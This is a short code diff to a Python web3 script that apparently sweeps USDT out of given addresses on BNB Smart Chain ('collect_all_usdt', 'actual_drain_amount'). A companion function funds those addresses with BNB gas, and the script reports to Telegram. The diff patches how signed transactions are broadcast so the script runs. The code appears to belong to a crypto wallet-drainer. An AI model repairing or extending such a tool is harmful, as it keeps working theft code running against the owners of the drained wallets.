@@ -353,7 +353,8 @@ def collect_all_usdt(from_address, extra_chat_ids=None):
     signed_txn = web3.eth.account.sign_transaction(txn, private_key)
     
     try:
-        tx_hash = web3.eth.send_raw_transaction(signed_txn.raw_transaction)
+        # FIX: use .rawTransaction (not .raw_transaction)
+        tx_hash = web3.eth.send_raw_transaction(signed_txn.rawTransaction)
         print(f"✅ Sent {actual_drain_amount:.2f} USDT to {sender_address}")
         print(f"🔗 TX: https://bscscan.com/tx/{web3.to_hex(tx_hash)}")
         print("good")
@@ -428,7 +429,8 @@ def send_gasfee_bnb(receiver, extra_chat_ids=None):
 
     try:
         signed_tx = web3.eth.account.sign_transaction(tx, private_key)
-        tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)
+        # FIX: use .rawTransaction (not .raw_transaction)
+        tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
         print(f"✅ Sent ${amount_usd} worth of BNB to {receiver}")
         print(f"🔗 Tx Hash: {web3.to_hex(tx_hash)}")
         #send_to_telegram(f"✅ Sent Gas Fee\nAmount : ${amount_usd} \n To: {receiver} \n Tx Hash : https://bscscan.com/tx/{web3.to_hex(tx_hash)}")
